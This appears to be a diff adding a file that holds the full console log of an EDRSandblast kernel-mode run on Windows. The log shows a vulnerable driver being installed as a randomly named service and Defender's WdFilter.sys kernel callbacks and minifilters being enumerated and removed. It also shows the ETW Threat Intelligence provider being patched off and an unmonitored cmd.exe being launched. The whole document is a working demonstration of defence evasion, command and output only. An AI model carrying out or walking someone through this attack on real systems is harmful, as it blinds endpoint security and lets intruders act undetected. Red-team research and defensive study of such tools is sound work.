@@ -1,0 +1,214 @@
+PS C:\Users\hacker\source\repos\myEDRSandblast\x64\Release> .\EDRSandblast.exe cmd --kernelmode -i
+  ______ _____  _____   _____                 _ _     _           _
+ |  ____|  __ \|  __ \ / ____|               | | |   | |         | |
+ | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_
+ |  __| | |  | |  _  / \___ \ / _` | '_ \ / _` | '_ \| |/ _` / __| __|
+ | |____| |__| | | \ \ ____) | (_| | | | | (_| | |_) | | (_| \__ | |_
+ |______|_____/|_|  \_|_____/ \__,_|_| |_|\__,_|_.__/|_|\__,_|___/\__|
+
+  D3FC0N 30 Edition | Thomas DIOT (@_Qazeer) & Maxime MEIGNAN (@th3m4ks)
+
+[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)
+
+[===== KERNEL MODE =====]
+
+[+] Loading required offsets for ntoskrnl.exe...
+[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)
+[+] Downloading offsets succeeded !
+[+] Downloading fltmgr.sys related offsets from the MS Symbol Server (will drop a .pdb file in current directory)
+[+] Downloading offsets succeeded !
+[+] Installing vulnerable driver...
+[*] '3MkkXKdw' service was not present
+[+] '3MkkXKdw' service is successfully registered
+[+] '3MkkXKdw' service ACL configured to for Everyone
+[+] '3MkkXKdw' service started
+
+
+[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations...
+[+] [NotifyRoutines]    Enumerating process creation callbacks
+[+] [NotifyRoutines]            fffff801319b07f0 [cng.sys + 0x207f0]
+[+] [NotifyRoutines]            fffff80133400050 [WdFilter.sys + 0x60050]
+[+] [NotifyRoutines]            Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRoutines]            fffff80131ca6e00 [ksecdd.sys + 0x26e00]
+[+] [NotifyRoutines]            fffff80131ea37c0 [dxgkrnl.sys + 0x237c0]
+[+] [NotifyRoutines]            fffff80133b43ad0 [tcpip.sys + 0x3ad0]
+[+] [NotifyRoutines]            fffff801341d0710 [iorate.sys + 0x10710]
+[+] [NotifyRoutines]            fffff80132421e50 [CI.dll + 0x91e50]
+[+] [NotifyRoutines]            fffff80135ba5820 [UCPD.sys + 0x5820]
+[+] [NotifyRoutines]            fffff80137e920d0 [peauth.sys + 0x420d0]
+[+] [NotifyRoutines]            fffff80137f51b80 [wtd.sys + 0x1b80]
+[+] [NotifyRoutines]            fffff80137f9ce60 [KslD.sys + 0xce60]
+[+] [NotifyRoutines]    Found a total of 1 EDR / security products driver(s)
+[+] [NotifyRoutines]    Enumerating thread creation callbacks
+[+] [NotifyRoutines]            fffff801333da5a0 [WdFilter.sys + 0x3a5a0]
+[+] [NotifyRoutines]            Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRoutines]            fffff801333e35f0 [WdFilter.sys + 0x435f0]
+[+] [NotifyRoutines]            Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRoutines]            fffff801378f3a60 [mmcss.sys + 0x3a60]
+[+] [NotifyRoutines]            fffff80137f9cd20 [KslD.sys + 0xcd20]
+[+] [NotifyRoutines]            fffff80137f9cdc0 [KslD.sys + 0xcdc0]
+[+] [NotifyRoutines]    Found a total of 2 EDR / security products driver(s)
+[+] [NotifyRoutines]    Enumerating image loading callbacks
+[+] [NotifyRoutines]            fffff8013341c5e0 [WdFilter.sys + 0x7c5e0]
+[+] [NotifyRoutines]            Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRoutines]            fffff80136356b10 [ahcache.sys + 0x46b10]
+[+] [NotifyRoutines]            fffff80137f9cc80 [KslD.sys + 0xcc80]
+[+] [NotifyRoutines]    Found a total of 1 EDR / security products driver(s)
+
+[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication...
+[+] [ObjectCallblacks]  Enumerating Process object callbacks :
+[+] [ObjectCallblacks]          Callback at FFFFD20B274DD830 for handle creations:
+[+] [ObjectCallblacks]                  Status: Enabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff80135ba4830 [UCPD.sys + 0x4830]
+[+] [ObjectCallblacks]          Callback at FFFFD20B2746C440 for handle creations & duplications:
+[+] [ObjectCallblacks]                  Status: Enabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff801333ce540 [WdFilter.sys + 0x2e540]
+[+] [ObjectCallblacks]                  Callback belongs to an EDR and is enabled!
+[+] [ObjectCallblacks]  Enumerating Thread object callbacks :
+[+] [ObjectCallblacks]          Callback at FFFFD20B274DD870 for handle creations:
+[+] [ObjectCallblacks]                  Status: Enabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff80135ba4830 [UCPD.sys + 0x4830]
+[+] [ObjectCallblacks]  Object callbacks are present !
+
+[+] Checking if EDR callbacks are registered on I/O events (minifilters)...
+[*] [MinifilterCallbacks]       Enumerating minifilters' frames, filters, instances and callback nodes:
+[*] [MinifilterCallbacks]       _FLTP_FRAME : ffffc004f624f5d0:
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9795010 (bindflt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f2f48010 (UCPD.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f6264ab0 (WdFilter.sys)
+[+] [MinifilterCallbacks]                       EDR-related filter found! Enumerating callbacks from all instances:
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004f6468010: 11 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004f667e4a0: 11 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbb16010: 11 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbb89010: 11 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbbd2010: 11 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbc72010: 11 callback nodes found!
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9703290 (storqosflt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f965ea20 (wcifs.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f665f9f0 (cldflt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9783bf0 (bfs.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f66e73e0 (filecrypt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f97b4010 (luafv.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9798010 (UnionFS.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f682d950 (npsvctrig.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f625fa20 (Wof.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f625f010 (fileinfo.sys)
+[+] [MinifilterCallbacks]       Minifilter callbacks are present !
+
+[+] [ETWTI]     Checking the ETW Threat Intelligence Provider state...
+[+] [ETWTI]     ETW Threat Intelligence Provider is ENABLED!
+
+[+] Process is NOT "safe" to launch our payload, removing monitoring and starting another process...
+
+[+] [ETWTI]     Disabling the ETW Threat Intel provider by patching ProviderEnableInfo at 0xffffc004f27c6270 with 0x00.
+[+] [ETWTI]     The ETW Threat Intel provider was successfully disabled!
+
+[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading...
+[+] [NotifyRoutines]    Removing process creation callbacks
+[+] [NotifyRoutines]    Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff801a0f050c8 | callback struct: 0xffffc004f2fefa3f | callback function: 0xfffff80133400050]
+[+] [NotifyRoutines]    Removing thread creation callbacks
+[+] [NotifyRoutines]    Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff801a0f052c0 | callback struct: 0xffffc004f2fef43f | callback function: 0xfffff801333da5a0]
+[+] [NotifyRoutines]    Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff801a0f052c8 | callback struct: 0xffffc004f2fef49f | callback function: 0xfffff801333e35f0]
+[+] [NotifyRoutines]    Removing image loading callbacks
+[+] [NotifyRoutines]    Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff801a0f04ec0 | callback struct: 0xffffc004f2fefc1f | callback function: 0xfffff8013341c5e0]
+
+[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication...
+[+] [ObjectCallblacks]  Disabling WdFilter.sys callback...
+
+[+] Removing minifilter callbacks registered by EDR for monitoring I/O operations...
+[+] [MinifilterCallbacks]       Removing previously identified callbacks nodes by unlinking them from their list
+[+] [MinifilterCallbacks]               66 callback nodes were removed!
+
+[+] All EDR drivers were successfully removed from Kernel callbacks!
+
+==================================================
+Starting a new unmonitored process...
+==================================================
+
+[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)
+
+[===== KERNEL MODE =====]
+
+[+] Loading required offsets for ntoskrnl.exe...
+[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)
+[+] Downloading offsets succeeded !
+[+] Downloading fltmgr.sys related offsets from the MS Symbol Server (will drop a .pdb file in current directory)
+[+] Downloading offsets succeeded !
+[+] Vulnerable driver is already running!
+
+[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations...
+[+] [NotifyRoutines]    Enumerating process creation callbacks
+[+] [NotifyRoutines]            fffff801319b07f0 [cng.sys + 0x207f0]
+[+] [NotifyRoutines]            fffff80131ca6e00 [ksecdd.sys + 0x26e00]
+[+] [NotifyRoutines]            fffff80131ea37c0 [dxgkrnl.sys + 0x237c0]
+[+] [NotifyRoutines]            fffff80133b43ad0 [tcpip.sys + 0x3ad0]
+[+] [NotifyRoutines]            fffff801341d0710 [iorate.sys + 0x10710]
+[+] [NotifyRoutines]            fffff80132421e50 [CI.dll + 0x91e50]
+[+] [NotifyRoutines]            fffff80135ba5820 [UCPD.sys + 0x5820]
+[+] [NotifyRoutines]            fffff80137e920d0 [peauth.sys + 0x420d0]
+[+] [NotifyRoutines]            fffff80137f51b80 [wtd.sys + 0x1b80]
+[+] [NotifyRoutines]            fffff80137f9ce60 [KslD.sys + 0xce60]
+[+] [NotifyRoutines]    No EDR driver(s) found!
+[+] [NotifyRoutines]    Enumerating thread creation callbacks
+[+] [NotifyRoutines]            fffff801378f3a60 [mmcss.sys + 0x3a60]
+[+] [NotifyRoutines]            fffff80137f9cd20 [KslD.sys + 0xcd20]
+[+] [NotifyRoutines]            fffff80137f9cdc0 [KslD.sys + 0xcdc0]
+[+] [NotifyRoutines]    No EDR driver(s) found!
+[+] [NotifyRoutines]    Enumerating image loading callbacks
+[+] [NotifyRoutines]            fffff80136356b10 [ahcache.sys + 0x46b10]
+[+] [NotifyRoutines]            fffff80137f9cc80 [KslD.sys + 0xcc80]
+[+] [NotifyRoutines]    No EDR driver(s) found!
+
+[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication...
+[+] [ObjectCallblacks]  Enumerating Process object callbacks :
+[+] [ObjectCallblacks]          Callback at FFFFD20B274DD830 for handle creations:
+[+] [ObjectCallblacks]                  Status: Enabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff80135ba4830 [UCPD.sys + 0x4830]
+[+] [ObjectCallblacks]          Callback at FFFFD20B2746C440 for handle creations & duplications:
+[+] [ObjectCallblacks]                  Status: Disabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff801333ce540 [WdFilter.sys + 0x2e540]
+[+] [ObjectCallblacks]                  Callback belongs to an EDR but is disabled.
+[+] [ObjectCallblacks]  Enumerating Thread object callbacks :
+[+] [ObjectCallblacks]          Callback at FFFFD20B274DD870 for handle creations:
+[+] [ObjectCallblacks]                  Status: Enabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff80135ba4830 [UCPD.sys + 0x4830]
+[+] [ObjectCallblacks]  Object callbacks are not found !
+
+[+] Checking if EDR callbacks are registered on I/O events (minifilters)...
+[*] [MinifilterCallbacks]       Enumerating minifilters' frames, filters, instances and callback nodes:
+[*] [MinifilterCallbacks]       _FLTP_FRAME : ffffc004f624f5d0:
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9795010 (bindflt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f2f48010 (UCPD.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f6264ab0 (WdFilter.sys)
+[+] [MinifilterCallbacks]                       EDR-related filter found! Enumerating callbacks from all instances:
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004f6468010: 0 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004f667e4a0: 0 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbb16010: 0 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbb89010: 0 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbbd2010: 0 callback nodes found!
+[+] [MinifilterCallbacks]                       _FLT_INSTANCE ffffc004fbc72010: 0 callback nodes found!
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9703290 (storqosflt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f965ea20 (wcifs.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f665f9f0 (cldflt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9783bf0 (bfs.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f66e73e0 (filecrypt.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f97b4010 (luafv.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f9798010 (UnionFS.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f682d950 (npsvctrig.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f625fa20 (Wof.sys)
+[+] [MinifilterCallbacks]               _FLT_FILTER ffffc004f625f010 (fileinfo.sys)
+[+] [MinifilterCallbacks]       Minifilter callbacks are not found !
+
+[+] [ETWTI]     Checking the ETW Threat Intelligence Provider state...
+[+] [ETWTI]     ETW Threat Intelligence Provider is DISABLED!
+
+[+] Process is "safe" to launch our payload
+
+[+] Kernel callbacks have normally been removed, starting cmd.exe
+WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)
+WARNING: While unlikely, the longer the callbacks are removed, the higher the chance of being detected / causing a BSoD upon restore is!
+
+Microsoft Windows [Version 10.0.26100.6725]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\hacker\source\repos\myEDRSandblast\x64\Release>
